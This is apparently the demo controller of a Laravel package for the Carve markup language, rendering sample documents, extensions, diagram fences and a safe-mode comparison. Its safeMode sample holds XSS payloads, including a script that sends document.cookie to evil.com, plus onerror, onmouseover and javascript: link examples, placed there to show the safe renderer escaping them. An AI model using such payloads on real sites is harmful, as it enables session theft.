<?php

declare(strict_types=1);

namespace App\Http\Controllers;

use App\Http\Requests\ArticleRequest;
use App\Models\Article;
use Illuminate\Http\Request;
use Illuminate\View\View;
use MarkupCarve\LaravelCarve\Service\CarveConverterInterface;
use MarkupCarve\LaravelCarve\Service\CarveManager;
use MarkupCarve\LaravelCarve\Service\ExtensionFactory;

class DemoController extends Controller
{
    private const SAMPLE_DJOT = <<<'CARVE'
    # Welcome to Carve

    This is a paragraph with /emphasis/, *strong*, _underline_ and /*both combined*/.

    ## Features

    - Clean, consistent syntax
    - Task lists: `[x]` done, `[-]` dropped, `[>]` deferred
    - Much more!

    > One syntax, one meaning - and the same HTML from every implementation.
    ^ The Carve design principles

    ### Code Example

    ```php
    $html = $carve->toHtml('Hello *world*!');
    ```

    Visit the [Carve organization](https://github.com/markup-carve) for more.
    CARVE;

    private const USER_CONTENT = <<<'CARVE'
    ## User Comment

    This is /user submitted/ content.

    It uses *safe mode* to prevent XSS:

    <script>alert('xss')</script>

    The script tag above will be escaped.
    CARVE;

    public function index(): View
    {
        return view('demo.index');
    }

    public function bladeDirective(): View
    {
        return view('demo.blade_directive', [
            'carve_content' => self::SAMPLE_DJOT,
            'user_content' => self::USER_CONTENT,
        ]);
    }

    public function facade(): View
    {
        return view('demo.facade');
    }

    public function service(CarveConverterInterface $carve, CarveManager $manager): View
    {
        return view('demo.service', [
            'html' => $carve->toHtml(self::SAMPLE_DJOT),
            'text' => $carve->toText(self::SAMPLE_DJOT),
            'safe_html' => $manager->toHtml(self::USER_CONTENT, 'user_content'),
            'carve_source' => self::SAMPLE_DJOT,
            'user_source' => self::USER_CONTENT,
        ]);
    }

    public function form(Request $request, CarveConverterInterface $carve): View
    {
        $article = new Article();
        $article->title = $request->session()->get('article.title', '');
        $article->body = $request->session()->get('article.body', self::SAMPLE_DJOT);
        $article->comment = $request->session()->get('article.comment');

        $preview = $request->session()->get('article.preview');

        return view('demo.form', [
            'article' => $article,
            'preview' => $preview,
        ]);
    }

    public function formSubmit(ArticleRequest $request, CarveConverterInterface $carve): \Illuminate\Http\RedirectResponse
    {
        $data = $request->validated();
        $manager = app(CarveManager::class);

        $preview = [
            'title' => $data['title'],
            'body_html' => $carve->toHtml($data['body']),
            'comment_html' => !empty($data['comment'])
                ? $manager->toHtml($data['comment'], 'user_content')
                : null,
        ];

        return redirect()->route('form')
            ->with('article.title', $data['title'])
            ->with('article.body', $data['body'])
            ->with('article.comment', $data['comment'] ?? null)
            ->with('article.preview', $preview);
    }

    public function staticMode(CarveManager $manager): View
    {
        $source = <<<'CARVE'
        ::: details "How does degradation work?"
        The disclosure stays a native `<details>` element; in static mode it
        renders `open` so nothing is hidden on paper.
        :::

        Math survives too: $`E = mc^2`.
        CARVE;

        return view('demo.static_mode', [
            'source' => $source,
            'interactive_html' => $manager->toHtml($source, 'default'),
            'static_html' => $manager->toHtml($source, 'print'),
        ]);
    }

    public function safeMode(CarveConverterInterface $carve, CarveManager $manager): View
    {
        $maliciousContent = <<<'CARVE'
        # User Post

        Normal content here.

        <script>document.location='https://evil.com/?cookie='+document.cookie</script>

        <img src="x" onerror="alert('XSS')">

        <div onmouseover="alert('XSS')">Hover me</div>

        [Click me](javascript:alert('XSS'))

        More normal content.
        CARVE;

        return view('demo.safe_mode', [
            'source' => $maliciousContent,
            'unsafe_html' => $carve->toHtml($maliciousContent),
            'safe_html' => $manager->toHtml($maliciousContent, 'user_content'),
        ]);
    }

    public function plainText(CarveConverterInterface $carve): View
    {
        return view('demo.plain_text', [
            'source' => self::SAMPLE_DJOT,
            'text' => $carve->toText(self::SAMPLE_DJOT),
        ]);
    }

    public function extensions(CarveManager $manager): View
    {
        $autolinkSource = <<<'CARVE'
        Check out https://github.com/markup-carve/carve for more info.

        Email us at hello@example.com for support.
        CARVE;

        $externalLinksSource = <<<'CARVE'
        Visit [our site](https://example.com) (internal) or [GitHub](https://github.com) (external).
        CARVE;

        $smartQuotesSource = <<<'CARVE'
        He said "Hello, world!" and she replied 'How are you?'

        It's a beautiful day -- don't you think?
        CARVE;

        $headingPermalinksSource = <<<'CARVE'
        # Introduction

        Some intro text.

        ## Getting Started

        More content here.

        ### Installation

        Install instructions.
        CARVE;

        $mentionsSource = <<<'CARVE'
        Thanks @dereuromark for the review!

        Also cc @teamlead for the docs review.
        CARVE;

        $tocSource = <<<'CARVE'
        ::: toc
        :::

        # Chapter 1

        Content for chapter 1.

        ## Section 1.1

        Subsection content.

        ## Section 1.2

        More content.

        # Chapter 2

        Chapter 2 content.
        CARVE;

        $wikilinksSource = <<<'CARVE'
        See [[Home]] for the main page.

        Related: [[Getting Started]] and [[API Reference]].
        CARVE;

        $defaultAttrsSource = <<<'CARVE'
        Here's an image:

        ![Photo](https://placehold.co/150)

        And a table:

        | Name | Role |
        |------|------|
        | Alice | Admin |
        | Bob | User |

        A [link](https://example.com) with default class.
        CARVE;

        $frontmatterSource = <<<'CARVE'
        ---yaml
        title: My Document
        author: John Doe
        date: 2026-01-15
        ---

        # Document Title

        This content has YAML frontmatter.
        CARVE;

        $semanticSource = <<<'CARVE'
        Press [Ctrl+C]{kbd} to copy.

        The term [API]{dfn="Application Programming Interface"} is important.

        [HTML]{abbr="HyperText Markup Language"} is the foundation of the web.
        CARVE;

        $mermaidSource = <<<'CARVE'
        ``` mermaid
        graph LR
            A[Write Carve] --> B{Render}
            B --> C[Interactive HTML]
            B --> D[Static / PDF]
        ```
        CARVE;

        $codeGroupSource = <<<'CARVE'
        ::: code-group
        ```php [Composer]
        composer require markup-carve/laravel-carve
        ```

        ``` bash [NPM]
        npm install @example/carve
        ```

        ``` yaml [Docker]
        services:
          app:
            image: php:8.2
        ```
        :::
        CARVE;

        $admonitionSource = <<<'CARVE'
        ::: note
        This is a note.
        :::

        ::: warning Custom Title
        Be careful with this.
        :::

        ::: tip
        Carve supports admonitions out of the box.
        :::
        CARVE;

        return view('demo.extensions', [
            'autolink_source' => $autolinkSource,
            'autolink_html' => $manager->toHtml($autolinkSource),
            'external_links_source' => $externalLinksSource,
            'external_links_html' => $manager->toHtml($externalLinksSource),
            'smart_quotes_source' => $smartQuotesSource,
            'smart_quotes_html' => $manager->toHtml($smartQuotesSource),
            'heading_permalinks_source' => $headingPermalinksSource,
            'heading_permalinks_html' => $manager->toHtml($headingPermalinksSource),
            'mentions_source' => $mentionsSource,
            'mentions_html' => $manager->toHtml($mentionsSource, 'with_mentions'),
            'toc_source' => $tocSource,
            'toc_html' => $manager->toHtml($tocSource, 'with_toc'),
            'wikilinks_source' => $wikilinksSource,
            'wikilinks_html' => $manager->toHtml($wikilinksSource, 'with_wikilinks'),
            'default_attrs_source' => $defaultAttrsSource,
            'default_attrs_html' => $manager->toHtml($defaultAttrsSource, 'with_default_attrs'),
            'frontmatter_source' => $frontmatterSource,
            'frontmatter_html' => $manager->toHtml($frontmatterSource, 'with_frontmatter'),
            'semantic_source' => $semanticSource,
            'semantic_html' => $manager->toHtml($semanticSource, 'with_semantic'),
            'mermaid_source' => $mermaidSource,
            'mermaid_html' => $manager->toHtml($mermaidSource, 'with_mermaid'),
            'code_group_source' => $codeGroupSource,
            'code_group_html' => $manager->toHtml($codeGroupSource, 'with_code_group'),
            'admonition_source' => $admonitionSource,
            'admonition_html' => $manager->toHtml($admonitionSource, 'with_admonition'),
        ]);
    }

    public function diagrams(CarveManager $manager): View
    {
        // Every FencedRenderExtension preset, keyed by the CSS class the
        // extension emits. Each entry carries a short blurb, its browser
        // renderer, and a valid sample so it actually draws in the gallery.
        $diagrams = [
            'mermaid' => [
                'title' => 'Mermaid',
                'renderer' => 'mermaid.js (ESM, jsDelivr)',
                'blurb' => 'Flowcharts, sequence and state diagrams. Emits <pre class="mermaid">; mermaid.run() draws it.',
                'source' => <<<'CARVE'
                ``` mermaid
                graph LR
                    A[Write Carve] --> B{Render}
                    B --> C[Interactive HTML]
                    B --> D[Static / PDF]
                ```
                CARVE,
            ],
            'plantuml' => [
                'title' => 'PlantUML',
                'renderer' => 'public PlantUML server (~h hex encoding)',
                'blurb' => 'UML shapes Mermaid does not cover (sequence, use case, component). Claims plantuml and puml fences.',
                'source' => <<<'CARVE'
                ``` plantuml
                @startuml
                actor User
                participant "Laravel App" as App
                participant "laravel-carve" as Carve

                User -> App: submit Carve markup
                App -> Carve: toHtml(source, 'with_diagrams')
                Carve --> App: <pre class="plantuml">...</pre>
                App --> User: rendered page
                @enduml
                ```
                CARVE,
            ],
            'graphviz' => [
                'title' => 'Graphviz',
                'renderer' => '@hpcc-js/wasm Graphviz (WASM, jsDelivr)',
                'blurb' => 'DOT graphs. Claims both dot and graphviz fences; rendered to SVG entirely in the browser.',
                'source' => <<<'CARVE'
                ``` graphviz
                digraph Pipeline {
                    rankdir=LR;
                    node [shape=box, style=rounded];
                    Carve -> Parser -> AST -> Renderer -> HTML;
                    AST -> Markdown;
                    AST -> ANSI;
                }
                ```
                CARVE,
            ],
            'd2' => [
                'title' => 'D2',
                'renderer' => 'Kroki server (POST /d2/svg)',
                'blurb' => 'Terrastruct D2 diagrams. No practical in-browser build, so the demo posts the source to a public Kroki server; without network the source stays visible.',
                'source' => <<<'CARVE'
                ``` d2
                Author -> Carve: markup
                Carve -> Browser: <pre class="d2">
                Browser -> Kroki: render
                Kroki -> Browser: SVG
                ```
                CARVE,
            ],
            'vega-lite' => [
                'title' => 'Vega-Lite',
                'renderer' => 'vega + vega-lite + vega-embed (jsDelivr)',
                'blurb' => 'Declarative charts from a JSON spec. JSON mode: emits <div class="vega-lite"><script type="application/json">.',
                'source' => <<<'CARVE'
                ``` vega-lite
                {
                  "$schema": "https://vega.github.io/schema/vega-lite/v5.json",
                  "description": "A simple bar chart.",
                  "data": {"values": [
                    {"lang": "carve-rs", "speed": 100},
                    {"lang": "carve-js", "speed": 15},
                    {"lang": "carve-php", "speed": 5}
                  ]},
                  "mark": "bar",
                  "encoding": {
                    "x": {"field": "lang", "type": "nominal", "axis": {"labelAngle": 0}},
                    "y": {"field": "speed", "type": "quantitative"}
                  }
                }
                ```
                CARVE,
            ],
            'wavedrom' => [
                'title' => 'WaveDrom',
                'renderer' => 'wavedrom + default skin (jsDelivr)',
                'blurb' => 'Digital timing diagrams from a WaveJSON description.',
                'source' => <<<'CARVE'
                ``` wavedrom
                {"signal": [
                  {"name": "clk",  "wave": "p......"},
                  {"name": "req",  "wave": "0.1..0."},
                  {"name": "ack",  "wave": "0...1.0"}
                ]}
                ```
                CARVE,
            ],
            'chart' => [
                'title' => 'Chart.js',
                'renderer' => 'chart.js (UMD, jsDelivr)',
                'blurb' => 'Chart.js config as JSON. JSON mode: emits <div class="chart"><script type="application/json">.',
                'source' => <<<'CARVE'
                ``` chart
                {
                  "type": "doughnut",
                  "data": {
                    "labels": ["HTML", "Markdown", "ANSI", "Plain text"],
                    "datasets": [{
                      "data": [40, 25, 20, 15],
                      "backgroundColor": ["#ff2d20", "#f6ad55", "#4299e1", "#48bb78"]
                    }]
                  },
                  "options": {"plugins": {"legend": {"position": "right"}}}
                }
                ```
                CARVE,
            ],
            'abc' => [
                'title' => 'ABC notation',
                'renderer' => 'abcjs (jsDelivr)',
                'blurb' => 'Sheet music from ABC music notation, rendered to SVG.',
                'source' => <<<'CARVE'
                ``` abc
                X:1
                T:Carve Fanfare
                M:4/4
                L:1/4
                K:C
                C D E F | G A B c | c B A G | F E D C |]
                ```
                CARVE,
            ],
        ];

        foreach ($diagrams as $key => &$entry) {
            $entry['html'] = $manager->toHtml($entry['source'], 'with_diagrams');
        }
        unset($entry);

        // SVG img fence: the SVG body is sanitized (the <script> and the inline
        // onclick handler below are stripped) and emitted as a sandboxed
        // data:image/svg+xml <img>. Fully server-side, no client library needed.
        $imgFenceSource = <<<'CARVE'
        {alt="Carve logo mark"}
        ``` img
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120" width="120" height="120">
          <title>Carve logo mark</title>
          <rect width="120" height="120" rx="16" fill="#ff2d20"/>
          <path d="M30 78 L60 30 L90 78 Z" fill="#ffffff"/>
          <circle cx="60" cy="70" r="10" fill="#ff2d20"/>
          <script>alert('this script is stripped by the sanitizer')</script>
          <rect x="0" y="0" width="10" height="10" onclick="alert('handler stripped too')"/>
        </svg>
        ```
        CARVE;

        return view('demo.diagrams', [
            'diagrams' => $diagrams,
            'img_fence_source' => $imgFenceSource,
            'img_fence_html' => $manager->toHtml($imgFenceSource, 'with_img_fence'),
            'extension_types' => ExtensionFactory::types(),
        ]);
    }

    public function syntax(CarveManager $manager): View
    {
        $samples = [
            'inline_literal' => [
                'title' => 'Inline literal',
                'blurb' => 'A ! before a code span renders its contents as literal text with no code styling - '
                    . 'perfect for showing Carve syntax without it being interpreted or monospaced.',
                'source' => 'Type !`*strong*` and !`/emphasis/` to show the raw delimiters, '
                    . 'while `regular code` still gets a code box.',
            ],
            'task_lists' => [
                'title' => 'Task list markers',
                'blurb' => 'Carve recognises done, dropped and deferred task states in addition to the plain checkbox.',
                'source' => "- [x] Ship the gallery\n- [ ] Write the docs\n- [-] Drop the old approach\n- [>] Defer the polish",
            ],
            'tight_loose' => [
                'title' => 'Tight vs loose lists',
                'blurb' => 'Blank lines between items make a list loose: each item is wrapped in <p>, adding vertical '
                    . 'rhythm. Without blank lines the list is tight and compact.',
                'source' => "Tight:\n\n- one\n- two\n- three\n\nLoose:\n\n- one\n\n- two\n\n- three",
            ],
            'definition_lists' => [
                'title' => 'Definition lists',
                'blurb' => 'A term line starts with :: and each definition line starts with a colon and two spaces.',
                'source' => ":: Carve\n:  A post-Markdown lightweight markup language.\n\n"
                    . ":: Djot\n:  The syntax Carve builds on and diverges from.",
            ],
            'smart_typography' => [
                'title' => 'Dash-run and quote typography',
                'blurb' => 'Two hyphens become an en dash, three become an em dash, and three dots become an ellipsis. '
                    . 'Straight quotes curl into typographic quotes.',
                'source' => 'Pages 10--20 cover it -- but the details --- all of them --- come later... '
                    . 'She said "it just works" and I agreed.',
            ],
            'footnotes' => [
                'title' => 'Footnotes',
                'blurb' => 'A reference like [^1] links to a definition collected into an endnotes section, with a '
                    . 'back-link to where it was cited.',
                'source' => "Carve renders identically across every implementation.[^spec]\n\n"
                    . "[^spec]: Guaranteed by a shared conformance corpus.",
            ],
            'strict_column0' => [
                'title' => 'Strict column-0 block markers',
                'blurb' => 'Block markers only open a block at column 0. Indent a heading or fence marker and it stays '
                    . 'literal text - no accidental structure from stray leading spaces.',
                'source' => "This paragraph is real.\n\n   ### This stays literal (indented three spaces)\n\n"
                    . "# This is a real heading",
            ],
        ];

        foreach ($samples as &$sample) {
            $sample['html'] = $manager->toHtml($sample['source'], 'syntax');
        }
        unset($sample);

        return view('demo.syntax', [
            'samples' => $samples,
        ]);
    }

    public function renderTargets(CarveConverterInterface $carve): View
    {
        $source = <<<'CARVE'
        # Release notes

        Carve /renders/ to *four* targets from one source.

        - [x] HTML for the web
        - [x] Plain text for search
        - [ ] Your custom renderer

        > One syntax, one meaning.

        ```php
        $html = $carve->toHtml($source);
        ```

        See the [Carve org](https://github.com/markup-carve).
        CARVE;

        return view('demo.render_targets', [
            'source' => $source,
            'html' => $carve->toHtml($source),
            'text' => $carve->toText($source),
            'markdown' => $carve->toMarkdown($source),
            'ansi' => $carve->toAnsi($source),
        ]);
    }
}
